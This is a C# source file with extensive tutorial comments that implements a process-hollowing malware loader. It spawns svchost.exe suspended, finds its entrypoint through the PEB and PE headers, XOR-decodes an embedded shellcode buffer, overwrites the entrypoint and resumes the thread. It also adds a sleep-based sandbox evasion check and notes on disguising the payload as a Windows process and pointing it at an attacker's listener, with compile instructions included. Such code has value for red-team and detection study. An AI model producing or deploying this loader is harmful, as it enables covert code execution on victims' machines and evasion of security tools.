// ============================================================
// Process Hollowing (XOR Encoded)
// ============================================================
// WHAT THIS DOES:
//   "Hollows out" an existing process and replaces its code with shellcode.
//   The steps:
//     1. Create svchost.exe in SUSPENDED state (not running yet)
//     2. Find where its code starts in memory (the entrypoint)
//     3. Overwrite that memory with our shellcode
//     4. Resume the thread — it executes OUR code instead of svchost's code
//
// WHY THIS IS EFFECTIVE:
//   - The process appears as "svchost.exe" in Task Manager
//   - Process was created legitimately by Windows
//   - The process metadata (name, path) all point to a real Windows binary
//   - Only the memory contents have been changed
//
// THE ENTRYPOINT HUNT (complex part):
//   ASLR (Address Space Layout Randomization) means svchost.exe loads at a
//   different address each time. We need to dynamically find the entrypoint:
//
//   PEB (Process Environment Block) → base address of executable
//   → PE header (e_lfanew at offset 0x3C)
//   → Optional header (e_lfanew + 0x28)
//   → AddressOfEntryPoint (RVA)
//   → Actual entrypoint = base + RVA
//
// WHEN TO USE:
//   - When you want your shellcode to look like svchost.exe
//   - When security tools check process names/paths
//   - As an alternative to remote injection into existing processes
//
// HOW TO CUSTOMIZE:
//   1. Generate XOR-encoded shellcode for your IP/port
//   2. Replace buf[] below
//   3. Optionally change "svchost.exe" to another Windows process
//   4. Compile: csc.exe /unsafe /platform:x64 /out:hollow.exe hollow.cs
// ============================================================

using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        // CREATE_SUSPENDED: Creates the process but doesn't start its main thread.
        // The process is fully initialized but waiting. We can now modify its memory.
        public const uint CREATE_SUSPENDED = 0x4;

        // PROCESSBASICINFORMATION: The class for ZwQueryInformationProcess
        // that gives us the PEB address
        public const int PROCESSBASICINFORMATION = 0;

        // -------------------------------------------------------
        // Structs for CreateProcess output
        // -------------------------------------------------------

        // PROCESS_INFORMATION: Output from CreateProcess.
        // Contains handles and IDs for the new process and its main thread.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;  // Handle to the process — use for memory operations
            public IntPtr hThread;   // Handle to the main thread — use to resume/suspend
            public Int32 ProcessId;  // PID for reference
            public Int32 ThreadId;   // Thread ID for reference
        }

        // STARTUPINFO: Input to CreateProcess defining window/console settings.
        // We use all defaults (zeros) — we just need the process started suspended.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;           // Must be set to sizeof(STARTUPINFO)
            public string lpReserved; public string lpDesktop; public string lpTitle;
            public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
            public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
            public uint dwFlags; public short wShowWindow; public short cbReserved2;
            public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }

        // PROCESS_BASIC_INFORMATION: Returned by ZwQueryInformationProcess.
        // The key field is PebAddress — the address of the Process Environment Block.
        // The PEB contains the base address of the main executable.
        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;  // ← THIS is what we need: address of the PEB
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        // -------------------------------------------------------
        // Win32 / NT API imports
        // -------------------------------------------------------

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // CreateProcess: Creates a new process (and its primary thread).
        // lpCommandLine = "c:\windows\system32\svchost.exe" (the process to hollow)
        // dwCreationFlags = CREATE_SUSPENDED (main thread doesn't start yet)
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        // ZwQueryInformationProcess: NT-level function to get process information.
        // We use class 0 (ProcessBasicInformation) to get the PEB address.
        // The PEB is at PebAddress. At offset 0x10 in the PEB is the ImageBaseAddress.
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        // ReadProcessMemory: Read memory from another process.
        // We use this to read PEB data and PE header info from the suspended process.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        // WriteProcessMemory: Write to another process's memory.
        // We use this to write our shellcode over the entrypoint.
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // ResumeThread: Resume a suspended thread.
        // After we've overwritten the entrypoint, we resume the thread.
        // The thread's first instruction is now our shellcode.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // -------------------------------------------------------
            // SANDBOX EVASION: Sleep timing check
            // -------------------------------------------------------
            DateTime t1 = DateTime.Now;
            Sleep(10000);  // 10 second sleep
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;  // Sandbox detected — exit silently
            }

            // -------------------------------------------------------
            // SHELLCODE (XOR encoded, key = 0xfa)
            // -------------------------------------------------------
            // REPLACE with your encoded payload. Must be x64 shellcode.
            // The process we hollow (svchost.exe) is x64, so shellcode must match.
            byte[] buf = new byte[511] {
            0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
            0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
            0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
            0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
            0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
            0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
            0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2,
            0xe2, 0xaa, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
            0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
            0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
            0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
            0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
            0xbb, 0xa2, 0xa4, 0xa3, 0xb2, 0xfb, 0x2a, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
            0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
            0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
            0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
            0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x41, 0x3a, 0x52, 0x12, 0x7f, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
            0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
            0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
            0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
            0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
            0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
            0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
            0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
            0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
            0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
            0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
            0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
            0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
            0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
            0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
            0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
            0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
            0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
            0x2f
            };

            // -------------------------------------------------------
            // STEP 1: Create svchost.exe in SUSPENDED state
            // -------------------------------------------------------
            // We spawn svchost.exe but don't let it run yet.
            // CREATE_SUSPENDED (0x4): process is created but its primary thread is suspended.
            // The process exists in memory, fully initialized, waiting to start.
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe",
                IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in suspended state, PID {pInfo.ProcessId}. Success: {cResult}.");

            // -------------------------------------------------------
            // STEP 2: Get PEB address of suspended process
            // -------------------------------------------------------
            // ZwQueryInformationProcess with class 0 = ProcessBasicInformation.
            // Returns a PROCESS_BASIC_INFORMATION struct containing PebAddress.
            // PebAddress points to the Process Environment Block of svchost.exe.
            //
            // The PEB structure starts with:
            //   Offset 0x00: InheritedAddressSpace (BYTE)
            //   Offset 0x08: Mutant (PVOID)
            //   Offset 0x10: ImageBaseAddress (PVOID) ← THIS is what we need
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION,
                ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);

            // PebAddress + 0x10 = address of the ImageBaseAddress field within the PEB
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Located PEB address at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // -------------------------------------------------------
            // STEP 3: Find the entrypoint of svchost.exe
            // -------------------------------------------------------
            // This is the complex part. We need to:
            // 1. Read 8 bytes at PEB+0x10 to get ImageBaseAddress (the base where svchost.exe loaded)
            // 2. From ImageBaseAddress, read the first 0x200 bytes (the PE header area)
            // 3. At offset 0x3C in the PE data: e_lfanew = offset to the PE signature ("PE\0\0")
            // 4. At PE header offset + 0x28: AddressOfEntryPoint (RVA from image base)
            // 5. entrypoint = ImageBaseAddress + AddressOfEntryPoint

            // Step 3.1: Read ImageBaseAddress from PEB+0x10 (8 bytes = 64-bit pointer)
            byte[] procAddr = new byte[0x8];   // 8 bytes for the pointer
            byte[] dataBuf = new byte[0x200];  // 512 bytes of PE header data
            IntPtr bytesRW = new IntPtr();

            // Read 8 bytes at PEB+0x10 → gets address where svchost.exe image loaded
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);

            // Read 512 bytes starting at the executable's base address (the PE header)
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // Step 3.2: Get e_lfanew from offset 0x3C of the DOS header
            // The DOS header (IMAGE_DOS_HEADER) has e_lfanew at offset 0x3C.
            // e_lfanew is a 4-byte (UInt32) value = offset to the PE header ("PE\0\0")
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // Step 3.3: The RVA to the entrypoint is at PE header + 0x28
            // PE Optional Header layout (x64):
            //   Offset 0x00: Magic (0x20B for PE32+)
            //   Offset 0x10: AddressOfEntryPoint (4-byte RVA)  ← at e_lfanew + 0x28
            // (0x18 for PE32+ standard fields + 0x10 for AddressOfEntryPoint offset = 0x28)
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // Step 3.4: Read the 4-byte AddressOfEntryPoint RVA value
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"RVA value: {"0x" + rva.ToString("x")}.");

            // Step 3.5: Calculate absolute entrypoint address = ImageBaseAddress + RVA
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Entrypoint at absolute address: {"0x" + entrypointAddr.ToString("x")}.");

            // -------------------------------------------------------
            // STEP 4: XOR decode our shellcode
            // -------------------------------------------------------
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Console.WriteLine("XOR-decoded payload.");

            // -------------------------------------------------------
            // STEP 5: Overwrite entrypoint with shellcode
            // -------------------------------------------------------
            // Write our shellcode over the entrypoint of svchost.exe.
            // Now when the thread resumes, it will execute our shellcode.
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // -------------------------------------------------------
            // STEP 6: Resume the suspended thread → our shellcode executes
            // -------------------------------------------------------
            // ResumeThread lets the suspended main thread start running.
            // Its first instruction is now our shellcode at the "entrypoint."
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Resumed thread. Success: {rResult == 1}. Check your listener!");
        }
    }
}
